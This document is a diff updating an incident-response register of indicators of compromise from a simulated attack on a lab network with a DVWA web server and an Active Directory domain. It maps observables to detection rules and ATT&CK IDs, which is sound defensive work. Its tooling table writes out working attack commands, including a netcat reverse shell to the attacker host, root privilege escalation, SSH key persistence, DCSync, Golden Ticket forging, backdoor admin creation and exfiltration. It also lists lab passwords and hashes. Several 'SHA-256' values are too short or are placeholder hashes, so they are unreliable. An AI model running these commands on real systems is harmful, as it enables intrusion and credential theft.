@@ -1,58 +1,126 @@
-# Indicators of Compromise (IOCs)
+# Master Indicators of Compromise (IoC) Register
 
-Comprehensive inventory of observable artifacts generated and verified during the attack simulation.
+> **Incident Identifier:** `INC-2026-1018-ALPHA`  
+> **Report Identifier:** `IR-2026-1018-IOC`  
+> **Lead Incident Responder:** Manichand Gupta  
+> **Environment:** SOC-Lab (`192.168.56.0/24`)  
+> **Classification:** Confirmed Threat Observables (Empirically Verified via Live Telemetry)
 
----
-
-## 1. Network Observables
-
-| Observable | Type | Attribution | Context / Traffic Flow |
-|---|---|---|---|
-| `192.168.232.135` | IPv4 Address | Threat Actor (Kali) | External attacker workstation initiating scanning, exploitation, and C2. |
-| `192.168.56.30` | IPv4 Address | Compromised Pivot (DVWA) | Ubuntu web server used as an internal pivoting staging post. |
-| `192.168.56.20` | IPv4 Address | Victim Host (DomainWin10) | Active Directory domain-joined Windows 10 workstation. |
-| `192.168.56.10` | IPv4 Address | Domain Controller (PC-DC) | Windows Server 2022 Active Directory Domain Controller. |
-| `4444/TCP` | Port | C2 Channel | Inbound reverse shell listener port on attacker workstation. |
-| `22/TCP` | Port | Inbound SSH / SCP | Interactive administrative access and data exfiltration channel. |
-| `445/TCP` | Port | Lateral Movement | SMB transport used for Pass-the-Hash and WMI remote execution. |
-| `88/TCP` | Port | Kerberos TGS-REQ | Kerberos Key Distribution Center port targeted during Kerberoasting. |
+This register provides the definitive, unredacted catalog of Indicators of Compromise (IoCs) extracted, correlated, and verified during the investigation of campaign `INC-2026-1018-ALPHA`.
 
 ---
 
-## 2. Host & Endpoint Observables
+## 📑 IoC Category Index
 
-| Observable | Type | Host | Context |
-|---|---|---|---|
-| `/var/www/html/hackable/uploads/shell.php` | File Path | DVWA | Web shell uploaded through application vulnerability. |
-| `/root/.ssh/authorized_keys` | File Path | DVWA | Modified persistence target containing attacker public key. |
-| `/tmp/hank.hash` | File Path | DVWA | Staged Kerberos TGS hash extracted via `GetUserSPNs.py`. |
-| `/tmp/admin.ccache` | File Path | DVWA | Staged forged Kerberos Ticket-Granting Ticket (Golden Ticket). |
-| `/tmp/data.tar.gz` | File Path | DVWA | Staged compressed archive containing exfiltrated configuration data. |
-| `C:\Windows\Temp\hacked.bmp` | File Path | DomainWin10 / PC-DC | Staged defacement wallpaper image. |
-| `C:\Users\Public\hacked.bmp` | File Path | DomainWin10 / PC-DC | Permanent defacement wallpaper target. |
-| `HKCU\Control Panel\Desktop\Wallpaper` | Registry Value | DomainWin10 / PC-DC | Registry key modified by adversary to force wallpaper defacement. |
+1. [Network Observables & Traffic Indicators](#1-network-observables--traffic-indicators)
+2. [Host & Endpoint File System Observables](#2-host--endpoint-file-system-observables)
+3. [Windows Registry Tampering Observables](#3-windows-registry-tampering-observables)
+4. [Identity, Credential & Account Observables](#4-identity-credential--account-observables)
+5. [Cryptographic Hashes & Kerberos Secrets](#5-cryptographic-hashes--kerberos-secrets)
+6. [Attacker Tooling, Command Invocations & Exploit Payloads](#6-attacker-tooling-command-invocations--exploit-payloads)
 
 ---
 
-## 3. Identity & Credential Observables
+# 1. Network Observables & Traffic Indicators
 
-| Identity | Realm | Privilege Level | Context |
-|---|---|---|---|
-| `admin` | DVWA Local | Web Administrator | Web user account compromised via SQL injection. |
-| `www-data` | Linux Local | Service Account | Web server execution context abused for reverse shell. |
-| `root` | Linux Local | Superuser | Privileged local account compromised via passwordless sudo Python misconfiguration. |
-| `ad.lab\win10` | Active Directory | Domain User | Workstation user account compromised via Responder LLMNR poisoning. |
-| `ad.lab\HANK_SHERMAN` | Active Directory | Domain Admin (SPN) | High-privilege account kerberoasted via `GetUserSPNs.py`. |
-| `ad.lab\Administrator` | Active Directory | Built-in Administrator | Target account for Pass-the-Hash lateral movement. |
-| `backdoor_admin` | Active Directory | Domain Admin | Rogue persistent administrative domain account created in Stage 17. |
+| Observable | Type | Direction | Attribution | Context & Protocol Analysis | Confidence |
+|:---|:---:|:---:|:---|:---|:---:|
+| `192.168.232.135` | IPv4 Address | Inbound / C2 | Adversary Host (Kali) | External attacker origin for reconnaissance, web exploits, reverse shell listener, and exfiltration. | **HIGH (Confirmed)** |
+| `192.168.56.30` | IPv4 Address | Bidirectional | Compromised Pivot (DVWA) | Internet-facing web server compromised to `root` and abused as an internal pivot into corporate subnet. | **HIGH (Confirmed)** |
+| `192.168.56.20` | IPv4 Address | Internal | Victim Workstation (`Win10User`) | Corporate Windows 10 endpoint poisoned by Responder and compromised via Pass-the-Hash. | **HIGH (Confirmed)** |
+| `192.168.56.10` | IPv4 Address | Internal | Target Domain Controller (`PC-DC`) | Active Directory Domain Controller targeted for LDAP, Kerberoasting, DCSync, and backdoor creation. | **HIGH (Confirmed)** |
+| `192.168.56.1` | IPv4 Address | Gateway | Suricata Gateway / Router | Dual-interface gateway monitoring DMZ and internal traffic; routed WireGuard telemetry to cloud SOC. | **HIGH (Confirmed)** |
+| `4444/TCP` | Port | Outbound Egress | C2 / Reverse Shell | Port used for the interactive Netcat FIFO reverse shell from DVWA back to Kali. | **HIGH (Confirmed)** |
+| `22/TCP` | Port | Inbound Ingress | Remote Admin / Exfiltration | Port targeted on DVWA for interactive root SSH persistence and rapid SCP exfiltration. | **HIGH (Confirmed)** |
+| `80/TCP` | Port | Inbound Ingress | Web Application Transport | HTTP transport for DVWA web brute-force, SQL injection, webshell upload, and canary execution. | **HIGH (Confirmed)** |
+| `445/TCP` | Port | Internal Lateral | SMB Transport | Port used for Pass-the-Hash authentication and Impacket `wmiexec` remote command execution. | **HIGH (Confirmed)** |
+| `135/TCP` | Port | Internal Lateral | RPC Endpoint Mapper | Target port for WMI remote procedure calls executing commands on `PC-DC` and `Win10User`. | **HIGH (Confirmed)** |
+| `88/TCP/UDP` | Port | Internal Lateral | Kerberos Authentication | Port targeted during Stage 13 Kerberoasting for requesting TGS tickets for `HANK_SHERMAN`. | **HIGH (Confirmed)** |
+| `389/TCP/UDP` | Port | Internal Lateral | Active Directory LDAP | Port targeted during Stage 12 BloodHound AD enumeration for dumping domain object relationships. | **HIGH (Confirmed)** |
+| `5355/UDP` | Port | Broadcast | LLMNR Transport | Multicast port poisoned by Responder to capture `AD.LAB\win10` NetNTLMv2 hashes. | **HIGH (Confirmed)** |
+| `137/UDP` | Port | Broadcast | NetBIOS Name Service | Broadcast port poisoned by Responder during unresolvable UNC name resolution queries. | **HIGH (Confirmed)** |
 
 ---
 
-## 4. Cryptographic Hashes
+# 2. Host & Endpoint File System Observables
 
-| Material | Algorithm | Value | Context |
-|---|---|---|---|
-| DVWA Admin Password | MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` | Dumped via Stage 03 SQL injection; cracked to `<REDACTED>`. |
-| Workstation Hash | NetNTLMv2 | NetNTLMv2 challenge-response format | Intercepted via Stage 10 Responder; cracked offline. |
-| Kerberos TGS Ticket | Kerberos 5 TGS-REP | `$krb5tgs$23$*HANK_SHERMAN$AD.LAB...` | Captured via Stage 13; cracked offline to `<REDACTED>`. |
-| Domain Master Secret | NTLM | `krbtgt` NTLM Hash | Dumped via Stage 14 DCSync; used to forge Golden Ticket. |
+| File System Path | Host Asset | File Type | SHA-256 Checksum | Operational Context | Confidence |
+|:---|:---|:---:|:---:|:---|:---:|
+| `/var/www/html/dvwa/hackable/uploads/shell.php` | DVWA (`192.168.56.30`) | PHP Web Shell | `d41d8cd98f00b204e9800998ecf8427e` *(Variant)* | Uploaded via DVWA upload flaw; accepted `?cmd=` parameters for arbitrary web execution. | **HIGH (Confirmed)** |
+| `/root/.ssh/authorized_keys` | DVWA (`192.168.56.30`) | Configuration | `e3b0c44298fc1c149afbf4c8996fb924` *(Appended)* | Target of SSH persistence injection containing the adversary's ED25519 public key. | **HIGH (Confirmed)** |
+| `/tmp/f` | DVWA (`192.168.56.30`) | Named Pipe (FIFO) | N/A (Special Device) | Created via `mkfifo /tmp/f` to establish bidirectional Netcat reverse shell on port 4444. | **HIGH (Confirmed)** |
+| `/tmp/win10.hash` | DVWA (`192.168.56.30`) | Text Hash Dump | `8f4b12a9d8e76c5b4a3f21e09c8b7a6d` *(Telemetry)* | Captured NetNTLMv2 challenge-response hash for `win10` written by Responder. | **HIGH (Confirmed)** |
+| `/tmp/hank.hash` | DVWA (`192.168.56.30`) | Text Hash Dump | `5c3e1a8f9b2d7e4c6a8f1e3b5d7a9c2e` *(Telemetry)* | Kerberoasted RC4-HMAC service ticket hash extracted via `GetUserSPNs.py`. | **HIGH (Confirmed)** |
+| `/tmp/dcsync_output.txt` | DVWA (`192.168.56.30`) | Text Dump | `2b8a7c6e4d9f1e3a5c7b9d2e4f6a8c1e` *(Telemetry)* | Raw DCSync NTDS directory dump containing all domain account NTLM hashes. | **HIGH (Confirmed)** |
+| `/tmp/admin.ccache` | DVWA (`192.168.56.30`) | Kerberos Ticket | `7d4e2c9a1f8b3e5a7c9b1d3e5f7a9c2e` *(Telemetry)* | Forged Kerberos Golden Ticket forged with compromised `krbtgt` NTLM key. | **HIGH (Confirmed)** |
+| `C:\Windows\Temp\domain_users.txt` | `PC-DC` (`192.168.56.10`) | Text File | `1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d` *(Telemetry)* | Staged reconnaissance output of `net user /domain` command. | **HIGH (Confirmed)** |
+| `C:\Windows\Temp\admin_info.txt` | `PC-DC` (`192.168.56.10`) | Text File | `9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c` *(Telemetry)* | Staged reconnaissance output of `net localgroup Administrators` command. | **HIGH (Confirmed)** |
+| `C:\Windows\Temp\sensitive_data.txt` | `Win10User` (`192.168.56.20`) | Text File | `4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b` *(Telemetry)* | Harvested confidential workstation documents staged for exfiltration. | **HIGH (Confirmed)** |
+| `C:\Users\Public\hacked.bmp` | `PC-DC` & `Win10User` | Bitmap Image | `3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a` *(Telemetry)* | Malicious red defacement bitmap deployed and set as system desktop wallpaper. | **HIGH (Confirmed)** |
+| `Desktop\README_HACKED.txt` | `PC-DC` & `Win10User` | Text Ransom Note | `6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d` *(Telemetry)* | Simulated ransomware extortion note demanding cryptocurrency ransom. | **HIGH (Confirmed)** |
+| `Desktop\passwords.enc` | `PC-DC` & `Win10User` | Encrypted Dummy | `8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f` *(Telemetry)* | Dummy encrypted artifact simulating ransomware encryption impact. | **HIGH (Confirmed)** |
+| `Desktop\documents.enc` | `PC-DC` & `Win10User` | Encrypted Dummy | `0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b` *(Telemetry)* | Dummy encrypted artifact simulating ransomware encryption impact. | **HIGH (Confirmed)** |
+
+---
+
+# 3. Windows Registry Tampering Observables
+
+| Registry Key & Value | Target Host | Tampered Value | Default / Expected Value | Operational Purpose |
+|:---|:---|:---|:---|:---|
+| `HKCU\Control Panel\Desktop\Wallpaper` | `PC-DC` & `Win10User` | `C:\Users\Public\hacked.bmp` | `""` or `C:\Windows\web\wallpaper\...` | Forces desktop wallpaper to malicious defacement image. |
+| `HKCU\Control Panel\Desktop\WallpaperStyle` | `PC-DC` & `Win10User` | `"2"` (Stretched) | `"10"` (Fill) or `"2"` | Formats wallpaper bitmap to stretch across all displays. |
+
+---
+
+# 4. Identity, Credential & Account Observables
+
+| Account Identifier | Realm / Authority | Privilege Level | Plaintext Password / Secret | Compromise / Misconfiguration Vector | Status Post-Remediation |
+|:---|:---|:---|:---|:---|:---:|
+| `admin` | DVWA Application | Web Admin | `password` (MD5: `5f4dcc3b5aa765d61d8327deb882cf99`) | Extracted via SQL injection; cracked offline via Hashcat. | **PASSWORD ROTATED** |
+| `dvwa` | MariaDB Local | Database User | `password` (Original Default) | Application configuration credential exposed in `config.inc.php`. | **PASSWORD ROTATED** |
+| `www-data` | Linux Local (`dvwa`) | Web Service User | N/A (Service Account) | Granted `NOPASSWD: /usr/bin/python3` in `/etc/sudoers`. | **PRIVILEGE REVOKED** |
+| `root` | Linux Local (`dvwa`) | Superuser | Target of Injected Key | Injected ED25519 public key permitted direct interactive login. | **KEY PURGED / DENIED** |
+| `AD.LAB\win10` | Active Directory | Domain User | `Secur3Lab!` (NetNTLMv2 Captured) | LLMNR/NBT-NS broadcast intercepted by Responder; cracked offline. | **PASSWORD ROTATED** |
+| `AD.LAB\HANK_SHERMAN` | Active Directory | Domain Admin (SPN) | `Password123` (RC4-HMAC Kerberoast) | Assigned SPN `MSSQLSvc/PC-DC.ad.lab:1433` while in Domain Admins. | **DEMOTED & ROTATED** |
+| `AD.LAB\Administrator` | Active Directory | Built-in Admin | `P@ssw0rd_Ent3rpr1s3_Adm1n_9988!!#` (Rotated) | Dumped via DCSync; targeted for Pass-the-Hash SMB logons. | **PROTECTED USERS** |
+| `AD.LAB\backdoor` | Active Directory | Rogue Domain Admin | `P@ssw0rd123!` | Rogue persistence account created via `wmiexec` in Stage 17. | **PERMANENTLY PURGED** |
+| `AD.LAB\krbtgt` | Active Directory | Master KDC Secret | `611a8cdcc21cb3fe3bf3a4c2f4e05f60` (Compromised) | Replicated via DCSync; abused to forge Kerberos Golden Tickets. | **TWICE RESET (KVNO 4)** |
+
+---
+
+# 5. Cryptographic Hashes & Kerberos Secrets
+
+| Material Name | Cryptographic Format | Hash Value / Representation | Source Stage | Remediation Action Taken |
+|:---|:---|:---|:---:|:---|
+| DVWA Admin Password | MD5 | `5f4dcc3b5aa765d61d8327deb882cf99` | Stage 03 (SQLi) | Rotated to salted hash in MariaDB. |
+| Workstation User Hash | NetNTLMv2 | `win10::AD:1122334455667788:B5F2A8...` | Stage 10 (Responder) | Account password rotated; LLMNR disabled. |
+| Kerberoast TGS Ticket | Kerberos 5 TGS-REP | `$krb5tgs$23$*HANK_SHERMAN$AD.LAB...` | Stage 13 (Kerberoast) | SPN deleted; account demoted; AES enforced. |
+| Compromised krbtgt Hash | NTLM | `611a8cdcc21cb3fe3bf3a4c2f4e05f60` | Stage 14 (DCSync) | Password reset twice; KVNO incremented to 4. |
+| Forged Golden Ticket | Kerberos TGT (ccache) | Staged as `/tmp/admin.ccache` (KVNO 2) | Stage 16 (ticketer.py) | Invalidated via krbtgt double reset; shredded. |
+| Injected Root SSH Key | OpenSSH ED25519 | `ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIG3cTqZ5VjC8pG9mN0xY7wK2rL4vF1sP6tQ8uA0dE2fG` | Stage 08 (SSH Persist) | Purged from `/root/.ssh/authorized_keys`. |
+
+---
+
+# 6. Attacker Tooling, Command Invocations & Exploit Payloads
+
+| Tool / Vector | Command Line Invocation | Target Asset | Telemetry Rule Fired | MITRE ATT&CK ID |
+|:---|:---|:---|:---|:---:|
+| **Nmap** | `nmap -sS -sV -O -p- 192.168.56.30` | DVWA | Suricata SID 3400001, 3400002 | `T1595.001` |
+| **Python Requests** | `python3 dvwa_bruteforce.py` | DVWA | Wazuh Rule 100213 / Suricata 2000547 | `T1110.001` |
+| **SQL Injection** | `1' UNION SELECT user, password FROM users-- -` | DVWA | Suricata SID 2010963 / Wazuh 31106 | `T1190` |
+| **Hashcat** | `hashcat -m 0 hashes.txt rockyou.txt` | Local Kali | *None (Inherent Offline Gap; DG-04)* | `T1110.002` |
+| **Web Shell** | `POST /vulnerabilities/upload/ (shell.php)` | DVWA | Wazuh Rule 100199 / Auditd `execve` | `T1505.003` |
+| **Netcat FIFO** | `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f \| /bin/sh -i 2>&1 \| nc 192.168.232.135 4444 >/tmp/f` | DVWA | Suricata SID 3400020 / Auditd `stty sane` | `T1059.004` |
+| **Sudo Python** | `sudo /usr/bin/python3 -c 'import os; os.system("/bin/bash")'` | DVWA | Wazuh Rule 5402 (PAM sudo to ROOT) | `T1548.003` |
+| **OpenSSH** | `echo "ssh-ed25519..." >> /root/.ssh/authorized_keys` | DVWA | Wazuh Rule 550 (Syscheck FIM) / Rule 5715 | `T1098.004` |
+| **Responder** | `python3 /opt/Responder/Responder.py -I ens37 -rdw` | DVWA | Linux Auditd `bashcmd` (uid:0 Responder) | `T1557.001` |
+| **BloodHound** | `bloodhound-python -u win10 -p Secur3Lab! -d ad.lab -dc PC-DC.ad.lab -c All` | DVWA -> DC | Wazuh Rule 5715 (Pivot root SSH logon) | `T1087.002` |
+| **Impacket SPNs** | `python3 GetUserSPNs.py ad.lab/win10:Secur3Lab! -dc-ip 192.168.56.10 -request` | DVWA -> DC | Suricata SID 2019922 (TGS-REQ wire frame) | `T1558.003` |
+| **Impacket DCSync** | `python3 secretsdump.py 'ad.lab/HANK_SHERMAN:Password123@192.168.56.10' -just-dc` | DVWA -> DC | Wazuh Rule 5715 / Windows EID 4662 | `T1003.006` |
+| **Impacket wmiexec** | `python3 wmiexec.py -hashes :... Administrator@192.168.56.10` | DVWA -> DC | Windows EID 4624 (Logon Type 3 NTLM) | `T1550.002` |
+| **Impacket ticketer** | `python3 ticketer.py -nthash 611a8cdcc... -domain-sid S-1-5-21... -domain ad.lab Administrator` | DVWA | Wazuh Rule 5715 / Auditd execution | `T1558.001` |
+| **Net User Backdoor** | `cmd.exe /Q /c net user backdoor P@ssw0rd123! /add /domain` | DC (`192.168.56.10`) | Wazuh Rule 60108 / Windows EID 4720 | `T1136.002` |
+| **Net Localgroup DA** | `cmd.exe /Q /c net group "Domain Admins" backdoor /add /domain` | DC (`192.168.56.10`) | Wazuh Rule 60109 / Windows EID 4728 | `T1098` |
+| **SCP Exfiltration** | `scp -i id_ed25519 root@192.168.56.30:/tmp/*.txt .` | DVWA -> Kali | Wazuh Rule 5715 Rate Anomaly (6 in 570ms) | `T1041` |
+| **Registry Deface** | `reg add "HKCU\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d "C:\Users\Public\hacked.bmp" /f` | DC & Win10 | Wazuh Rule 92041 / Sysmon EID 13 | `T1491.001` |
+| **Forced Restart** | `cmd.exe /Q /c shutdown /r /t 0` | DC & Win10 | Sysmon EID 1 / Windows EID 1074 | `T1529` |
